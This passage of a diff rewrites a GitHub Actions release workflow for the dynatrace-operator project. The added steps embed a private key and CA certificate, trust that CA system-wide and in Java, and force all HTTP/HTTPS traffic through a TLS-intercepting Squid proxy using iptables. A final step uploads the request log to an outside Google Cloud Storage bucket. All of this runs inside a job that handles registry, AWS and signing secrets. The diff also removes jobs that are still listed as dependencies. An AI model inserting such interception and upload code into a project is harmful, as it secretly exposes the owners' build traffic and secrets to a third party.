+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout
+      uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871
+    - continue-on-error: true
+      if: ${{ matrix.registry != 'amazon-ecr' }}
+      name: Login to Registry
+      uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567
+      with:
+        password: ${{ secrets[matrix.password] }}
+        registry: ${{ matrix.url }}
+        username: ${{ secrets[matrix.username] }}
+    - continue-on-error: true
+      if: ${{ matrix.registry == 'amazon-ecr' }}
+      name: Configure aws credentials
+      uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
+      with:
+        aws-region: us-east-1
+        role-to-assume: ${{ secrets.ECR_IMAGEPUSH_ROLE }}
+    - continue-on-error: true
+      if: ${{ matrix.registry == 'amazon-ecr' }}
+      name: Login to Amazon ECR
+      uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076
+      with:
+        registry-type: public
+    - continue-on-error: true
+      id: push-image
+      name: Push ${{matrix.platform}} to ${{matrix.registry}}
+      uses: ./.github/actions/upload-image
+      with:
+        labels: ${{ needs.prepare.outputs.labels }}
+        platform: ${{ matrix.platform }}
+        registry: ${{ matrix.url }}
+        repository: ${{ secrets[matrix.repository] }}
+        version: ${{ needs.prepare.outputs.version }}
+    - continue-on-error: true
+      name: Sign image for ${{matrix.registry}}
+      uses: ./.github/actions/sign-image
+      with:
+        image: ${{ matrix.url }}/${{ secrets[matrix.repository] }}:${{ needs.prepare.outputs.version
+          }}-${{ matrix.platform }}@${{steps.push-image.outputs.digest}}
+        signing-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
+        signing-password: ${{ secrets.COSIGN_PASSWORD }}
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/Dynatrace/dynatrace-operator.$(date
+        +%s)
     strategy:
       matrix:
-        platform: [amd64, arm64, ppc64le, s390x]
-        registry: [gcr, dockerhub, amazon-ecr, rhcc]
         include:
-        - registry: gcr
-          url: gcr.io
+        - password: GCR_JSON_KEY
+          registry: gcr
           repository: GCR_REPOSITORY
+          url: gcr.io
           username: GCR_USERNAME
-          password: GCR_JSON_KEY
-        - registry: dockerhub
-          url: docker.io
+        - password: DOCKERHUB_PASSWORD
+          registry: dockerhub
           repository: DOCKERHUB_REPOSITORY
+          url: docker.io
           username: DOCKERHUB_USERNAME
-          password: DOCKERHUB_PASSWORD
         - registry: amazon-ecr
-          url: public.ecr.aws
           repository: ECR_REPOSITORY
-        - registry: rhcc
+          url: public.ecr.aws
+        - password: RHCC_PASSWORD
+          registry: rhcc
+          repository: RHCC_REPOSITORY
           url: quay.io
           username: RHCC_USERNAME
-          password: RHCC_PASSWORD
-          repository: RHCC_REPOSITORY
-    steps:
-      - name: Checkout
-        uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871 # v4.2.1
-      - name: Login to Registry
-        if: ${{ matrix.registry != 'amazon-ecr' }}
-        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
-        with:
-          registry: ${{ matrix.url }}
-          username: ${{ secrets[matrix.username] }}
-          password: ${{ secrets[matrix.password] }}
-      - name: Configure aws credentials
-        if: ${{ matrix.registry == 'amazon-ecr' }}
-        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
-        with:
-          role-to-assume: ${{ secrets.ECR_IMAGEPUSH_ROLE }}
-          aws-region: us-east-1
-      - name: Login to Amazon ECR
-        if: ${{ matrix.registry == 'amazon-ecr' }}
-        uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 # v2.0.1
-        with:
-          registry-type: public
-      - name: Push ${{matrix.platform}} to ${{matrix.registry}}
-        id: push-image
-        uses: ./.github/actions/upload-image
-        with:
-          platform: ${{ matrix.platform }}
-          labels: ${{ needs.prepare.outputs.labels }}
-          version: ${{ needs.prepare.outputs.version }}
-          registry: ${{ matrix.url }}
-          repository: ${{ secrets[matrix.repository] }}
-      - name: Sign image for ${{matrix.registry}}
-        uses: ./.github/actions/sign-image
-        with:
-          image: ${{ matrix.url }}/${{ secrets[matrix.repository] }}:${{ needs.prepare.outputs.version }}-${{ matrix.platform }}@${{steps.push-image.outputs.digest}}
-          signing-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
-          signing-password: ${{ secrets.COSIGN_PASSWORD }}
-
-  manifest:
-    name: Create Docker manifests
-    environment: Release
-    needs: [prepare, push]
-    runs-on: ubuntu-latest
-    permissions:
-      id-token: write
-    outputs:
-      digest: ${{ steps.create-manifests.outputs.digest }}
-    strategy:
-      matrix:
-        registry: [gcr, dockerhub, amazon-ecr, rhcc]
-        include:
-          - registry: gcr
-            url: gcr.io
-            repository: GCR_REPOSITORY
-            username: GCR_USERNAME
-            password: GCR_JSON_KEY
-          - registry: dockerhub
-            url: docker.io
-            repository: DOCKERHUB_REPOSITORY
-            username: DOCKERHUB_USERNAME
-            password: DOCKERHUB_PASSWORD
-          - registry: amazon-ecr
-            url: public.ecr.aws
-            repository: ECR_REPOSITORY
-          - registry: rhcc
-            url: quay.io
-            username: RHCC_USERNAME
-            password: RHCC_PASSWORD
-            repository: RHCC_REPOSITORY
-    steps:
-      - name: Checkout
-        uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871 # v4.2.1
-      - name: Login to Registry
-        if: ${{ matrix.registry != 'amazon-ecr' }}
-        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
-        with:
-          registry: ${{ matrix.url }}
-          username: ${{ secrets[matrix.username] }}
-          password: ${{ secrets[matrix.password] }}
-      - name: Configure aws credentials
-        if: ${{ matrix.registry == 'amazon-ecr' }}
-        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
-        with:
-          role-to-assume: ${{ secrets.ECR_IMAGEPUSH_ROLE }}
-          aws-region: us-east-1
-      - name: Login to Amazon ECR
-        if: ${{ matrix.registry == 'amazon-ecr' }}
-        uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 # v2.0.1
-        with:
-          registry-type: public
-      - name: Create manifests for ${{matrix.registry}}
-        uses: ./.github/actions/create-manifests
-        id: create-manifests
-        with:
-          version: ${{ needs.prepare.outputs.version }}
-          registry: ${{ matrix.url }}
-          repository: ${{ secrets[matrix.repository] }}
-          combined: true
-      - name: Sign images for ${{matrix.registry}}
-        uses: ./.github/actions/sign-image
-        with:
-          image: ${{ matrix.url }}/${{ secrets[matrix.repository] }}:${{ needs.prepare.outputs.version }}@${{ steps.create-manifests.outputs.digest }}
-          signing-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
-          signing-password: ${{ secrets.COSIGN_PASSWORD }}
-
-  attach-sbom:
-    name: Attach sbom
-    environment: Release
-    needs: [ prepare, push, manifest ]
-    runs-on: ubuntu-latest
-    permissions:
-      id-token: write
-    strategy:
-      matrix:
-        registry: [gcr, dockerhub, amazon-ecr]
-        include:
-          - registry: gcr
-            url: gcr.io
-            repository: GCR_REPOSITORY
-            username: GCR_USERNAME
-            password: GCR_JSON_KEY
-          - registry: dockerhub
-            url: docker.io
-            repository: DOCKERHUB_REPOSITORY
-            username: DOCKERHUB_USERNAME
-            password: DOCKERHUB_PASSWORD
-          - registry: amazon-ecr
-            url: public.ecr.aws
-            repository: ECR_REPOSITORY
-    steps:
-      - name: Checkout
-        uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871 # v4.2.1
-      - name: Login to Registry
-        if: ${{ matrix.registry != 'amazon-ecr' }}
-        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
-        with:
-          registry: ${{ matrix.url }}
-          username: ${{ secrets[matrix.username] }}
-          password: ${{ secrets[matrix.password] }}
-      - name: Configure aws credentials
-        if: ${{ matrix.registry == 'amazon-ecr' }}
-        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
-        with:
-          role-to-assume: ${{ secrets.ECR_IMAGEPUSH_ROLE }}
-          aws-region: us-east-1
-      - name: Login to Amazon ECR
-        if: ${{ matrix.registry == 'amazon-ecr' }}
-        uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 # v2.0.1
-        with:
-          registry-type: public
-      - name: Create sbom for ${{matrix.registry}}
-        id: sbom
-        uses: aquasecurity/trivy-action@5681af892cd0f4997658e2bacc62bd0a894cf564 # 0.27.0
-        with:
-          image-ref: ${{ matrix.url }}/${{ secrets[matrix.repository] }}:${{ needs.prepare.outputs.version }}@${{ needs.manifest.outputs.digest }}
-          format: 'cyclonedx'
-          output: 'result.json'
-          skip-dirs: '/usr/share/dynatrace-operator/third_party_licenses'
-      - name: Upload sbom to ${{matrix.registry}}
-        uses: ./.github/actions/upload-sbom
-        with:
-          image: ${{ matrix.url }}/${{ secrets[matrix.repository] }}:${{ needs.prepare.outputs.version }}@${{ needs.manifest.outputs.digest }}
-          sbom: 'result.json'
-          signing-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
-          signing-password: ${{ secrets.COSIGN_PASSWORD }}
-
-  run-preflight-rhcc:
-    name: Run preflight for rhcc
-    environment: Release
-    needs: [ prepare, push, manifest]
-    runs-on: ubuntu-latest
-    env:
-      SCAN_REGISTRY: "quay.io"
-    steps:
-      - name: Checkout
-        uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871 # v4.2.1
-      - name: Login to Registry
-        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
-        with:
-          registry: ${{ env.SCAN_REGISTRY }}
-          username: ${{ secrets.RHCC_USERNAME }}
-          password: ${{ secrets.RHCC_PASSWORD }}
-      - name: Run preflight
-        uses: ./.github/actions/preflight
-        with:
-          version: ${{ needs.prepare.outputs.version }}
-          registry: ${{ env.SCAN_REGISTRY }}
-          repository: ${{ secrets.RHCC_REPOSITORY }}
-          report-name: "preflight.json"
-          redhat-project-id: ${{ secrets.REDHAT_PROJECT_ID }}
-          pyxis-api-token: ${{ secrets.PYXIS_API_TOKEN }}
-
+        platform:
+        - amd64
+        - arm64
+        - ppc64le
+        - s390x
+        registry:
+        - gcr
+        - dockerhub
+        - amazon-ecr
+        - rhcc
+    timeout-minutes: 60
   release:
-    name: Create release
-    needs: [prepare, build, attach-sbom, manifest, run-preflight-rhcc]
     environment: Release
+    name: Create release
+    needs:
+    - prepare
+    - build
+    - attach-sbom
+    - manifest
+    - run-preflight-rhcc
     permissions:
       contents: write
-      pull-requests: write
       id-token: write
+      pull-requests: write
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
-        uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871 # v4.2.1
-      - name: Setup Golang
-        uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2
-        with:
-          go-version-file: "${{ github.workspace }}/go.mod"
-      - name: Download dependencies
-        id: depdownload
-        run: |
-          hack/build/ci/install-cgo-dependencies.sh
-      - name: Generate release notes
-        shell: bash
-        env:
-          PRE_RELEASE: ${{ contains(github.ref, '-rc.') }}
-        run: |
-          hack/build/ci/generate-release-notes.sh
-      - name: Generate K8s manifests
-        shell: bash
-        env:
-          VERSION_WITHOUT_PREFIX: ${{ needs.prepare.outputs.version_without_prefix }}
-          VERSION: ${{ needs.prepare.outputs.version }}
-        run: |
-          make manifests/crd/release CHART_VERSION="${VERSION_WITHOUT_PREFIX}"
+    - name: before
+      run: 'sudo apt update
 
-          make manifests/kubernetes/olm IMAGE="public.ecr.aws/dynatrace/dynatrace-operator" TAG="${VERSION}@${{needs.manifest.outputs.digest}}"
-          make manifests/kubernetes IMAGE="public.ecr.aws/dynatrace/dynatrace-operator" TAG="${VERSION}@${{needs.manifest.outputs.digest}}"
-          make manifests/openshift/olm IMAGE="registry.connect.redhat.com/dynatrace/dynatrace-operator" TAG="${VERSION}@${{needs.manifest.outputs.digest}}"
-          make manifests/openshift IMAGE="registry.connect.redhat.com/dynatrace/dynatrace-operator" TAG="${VERSION}@${{needs.manifest.outputs.digest}}"
-          cp config/deploy/kubernetes/kubernetes.yaml config/deploy/kubernetes/gke-autopilot.yaml
-      - name: Build helm packages
-        uses: ./.github/actions/build-helm
-        with:
-          version_without_prefix: ${{ needs.prepare.outputs.version_without_prefix }}
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          secring: ${{ secrets.HELM_SECRING }}
-          passphrase: ${{ secrets.HELM_PASSPHRASE }}
-          output-dir: "./helm-pkg"
-      - name: Login Helm to dockerhub
-        shell: bash
-        run: |
-          helm registry login -u "${{ secrets.DOCKERHUB_USERNAME }}" -p "${{ secrets.DOCKERHUB_PASSWORD }}" "registry.hub.docker.com"
-      - name: Login Docker to dockerhub
-        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
-        with:
-          registry: docker.io
-          username: ${{ secrets.DOCKERHUB_USERNAME }}
-          password: ${{ secrets.DOCKERHUB_PASSWORD }}
-      - name: Upload and sign helm package to dockerhub
-        uses: ./.github/actions/upload-helm
-        with:
-          version: ${{ needs.prepare.outputs.version }}
-          version-without-prefix: ${{ needs.prepare.outputs.version_without_prefix }}
-          cosign-private-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
-          cosign-password: ${{ secrets.COSIGN_PASSWORD }}
-      - name: Configure aws credentials
-        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
-        with:
-          role-to-assume: ${{ secrets.ECR_IMAGEPUSH_ROLE }}
-          aws-region: us-east-1
-      - name: Login to Amazon ECR
-        uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 # v2.0.1
-        with:
-          registry-type: public
-      - name: Upload and sign helm package to Amazon ECR
-        uses: ./.github/actions/upload-helm
-        with:
-          registry-url: public.ecr.aws
-          image-base-url: public.ecr.aws
-          version: ${{ needs.prepare.outputs.version }}
-          version-without-prefix: ${{ needs.prepare.outputs.version_without_prefix }}
-          cosign-private-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
-          cosign-password: ${{ secrets.COSIGN_PASSWORD }}
-      - name: Prepare cosign.pub artifact
-        env:
-          COSIGN_PUBLIC_KEY: ${{ secrets.COSIGN_PUBLIC_KEY }}
-        run: |
-          mkdir -p tmp
-          echo ${COSIGN_PUBLIC_KEY} | base64 -d > tmp/cosign.pub
-      - name: Create pre-release
-        uses: softprops/action-gh-release@v2
-        if: ${{ contains(github.ref, '-rc.') }}
-        with:
-          body_path: ./CHANGELOG.md
-          files: |
-            tmp/cosign.pub
-            config/deploy/dynatrace-operator-crd.yaml
-            config/deploy/kubernetes/kubernetes.yaml
-            config/deploy/openshift/openshift.yaml
-            config/deploy/kubernetes/kubernetes-csi.yaml
-            config/deploy/openshift/openshift-csi.yaml
-          token: ${{ secrets.GITHUB_TOKEN }}
-          prerelease: true
-          draft: true
-          fail_on_unmatched_files: true
-      - name: Create release
-        uses: softprops/action-gh-release@v2
-        if: ${{ !contains(github.ref, '-rc.') }}
-        with:
-          body_path: ./CHANGELOG.md
-          files: |
-            tmp/cosign.pub
-            config/deploy/dynatrace-operator-crd.yaml
-            config/deploy/kubernetes/kubernetes.yaml
-            config/deploy/kubernetes/gke-autopilot.yaml
-            config/deploy/openshift/openshift.yaml
-            config/deploy/kubernetes/kubernetes-csi.yaml
-            config/deploy/openshift/openshift-csi.yaml
-            helm-pkg/dynatrace-operator-${{ needs.prepare.outputs.version_without_prefix }}.tgz
-            helm-pkg/dynatrace-operator-${{ needs.prepare.outputs.version_without_prefix }}.tgz.prov
-          token: ${{ secrets.GITHUB_TOKEN }}
-          prerelease: false
-          draft: true
-          fail_on_unmatched_files: true
-      - name: Update index helm file
-        if: ${{ !contains(github.ref, '-rc.') }}
-        env:
-          VERSION_WITHOUT_PREFIX: ${{ needs.prepare.outputs.version_without_prefix }}
-        run: |
-          echo "Updating Helm repo index"
-          hack/build/ci/generate-new-helm-index-yaml.sh "helm-pkg" ${{ needs.prepare.outputs.version_without_prefix }}
-      - name: Create pull request for adding helm index to main branch
-        if: ${{ !contains(github.ref, '-rc.') }}
-        uses: peter-evans/create-pull-request@v7
-        with:
-          base: main
-          delete-branch: true
-          branch: create-pull-request/update-helm-index
-          branch-suffix: short-commit-hash
-          add-paths: |
-            ./config/helm/repos/stable/index.yaml
-            ./config/helm/repos/stable/index.yaml.previous
-          title: '[Automatic] Update index for ${{ github.ref }} release'
-          commit-message: Update index.yaml
-          committer: GitHub <noreply@github.com>
-          author: ${{ github.actor }} <${{ github.actor }}@users.noreply.github.com>
-          body: |
-            # Description
-            Upgrade `index.yaml` to include latest version of the helm chart.
-            ## How can this be tested?
-            Helm upgrade to and install of `${{ github.ref }}` works.
-            ## Checklist
-            - [x] PR is labeled accordingly
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
+
+        vQOqTPVeYwa6pK11+9UKqjGRldBimpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+l
+
+        XgMF0GfgpXRy2BULUxAYg8w4aTlR32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQX
+
+        G9QNYzMR+pGXsa1NNDRgSAvlQPMzLe9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1Qkzx
+
+        cZLqproEIqOlS4KsGXyo6BwhXH+HI82RCIbaj2ub4y355onYuAoTpsb9KBxud0He
+
+        jzQesYen8OmgbNo9+FfK5+Q5XvYb7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkg
+
+        pjo/nkhw2OyCji6DFXCvlJRCBoupn9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6s
+
+        sgX+FMDrzeiNArdmIHKCPC3QrSb6jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jit
+
+        qMJuHGwKPtHopVqxK8k7p0PKvuGqJIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B
+
+        0lu7LZ/Aoh3ckh71IrSKyZafXLpUmpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHq
+
